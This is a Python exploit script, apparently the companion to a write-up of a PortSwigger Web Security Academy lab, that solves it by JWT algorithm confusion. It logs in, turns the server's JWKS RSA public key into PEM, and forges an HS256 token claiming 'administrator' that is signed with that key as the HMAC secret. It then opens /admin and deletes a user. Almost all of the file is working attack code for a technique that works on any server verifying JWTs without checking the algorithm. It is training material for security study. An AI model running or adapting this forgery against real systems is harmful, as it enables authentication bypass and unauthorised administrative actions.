#!/usr/bin/env python3
"""
JWT authentication bypass via algorithm confusion
PortSwigger Web Security Academy -- JWT

Companion script for the writeup: 07-algorithm-confusion.md

What this does:
    Logs in to get a genuine RS256 session JWT, fetches the server's RSA
    public key from /jwks.json, and rebuilds that key as PEM using
    SubjectPublicKeyInfo (X.509) encoding -- the exact byte format the
    server caches internally. It then forges a token with "alg" changed to
    HS256 and signs it with those PEM bytes as the HMAC secret. If the
    server's verify(token, key) call is algorithm-agnostic, it treats its
    own RSA public key as an HMAC secret and accepts the forged signature.
    Sending that as the session cookie to /admin, then deleting carlos,
    solves the lab.

Usage:
    python 07-algorithm-confusion.py <lab-url>
    e.g. python 07-algorithm-confusion.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx cryptography
"""

import base64
import hashlib
import hmac
import json
import re
import sys
import httpx

from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def encode_jwt(header: dict, payload: dict, secret: bytes, algorithm: str = "HS256") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def exploit_algo_confusion(jwt_token: str, new_claims: dict, public_key_pem: str) -> str:
    """Forge a JWT using algorithm confusion (RS256 -> HS256), signing with the RSA public key PEM as the HMAC secret."""
    header, payload, _ = decode_jwt(jwt_token)
    payload.update(new_claims)
    header["alg"] = "HS256"
    return encode_jwt(header, payload, public_key_pem.encode(), "HS256")


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> str:
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""

    r = client.post(f"{base}/login", data={
        "csrf": csrf, "username": username, "password": password
    }, follow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("location", "/")
        if loc.startswith("/"):
            loc = f"{base}{loc}"
        client.get(loc, follow_redirects=True)
    return client.cookies.get("session", "")


def _fetch_jwks_pem(client: httpx.Client, base: str) -> str | None:
    for path in ["/jwks.json", "/.well-known/jwks.json"]:
        try:
            r = client.get(f"{base}{path}")
            if r.status_code == 200 and "keys" in r.text:
                keys = r.json().get("keys", [])
                if not keys:
                    continue
                jwk = keys[0]
                e = int.from_bytes(_b64url_decode(jwk["e"]), "big")
                n = int.from_bytes(_b64url_decode(jwk["n"]), "big")
                pub = RSAPublicNumbers(e, n).public_key(default_backend())
                return pub.public_bytes(
                    serialization.Encoding.PEM,
                    serialization.PublicFormat.SubjectPublicKeyInfo,
                ).decode()
        except Exception:
            pass
    return None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    session = _login(client, lab_url)
    if not session:
        print("[-] Login failed")
        return
    print(f"[+] Got session JWT: {session[:50]}...")

    pem = _fetch_jwks_pem(client, lab_url)
    if not pem:
        print("[-] No JWKS keys found at /jwks.json or /.well-known/jwks.json")
        return
    print(f"[+] Public key converted to PEM (SubjectPublicKeyInfo / X.509)")

    forged = exploit_algo_confusion(session, {"sub": "administrator"}, pem)
    print(f"[+] Forged token with alg=HS256, signed using the RSA public key PEM as the HMAC secret")

    client.cookies.clear()
    client.cookies.set("session", forged)
    r = client.get(f"{lab_url}/admin")
    print(f"[*] /admin -> {r.status_code}")

    if "/admin/delete" in r.text:
        r = client.get(f"{lab_url}/admin/delete?username=carlos")
        print(f"[*] Delete carlos -> {r.status_code}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
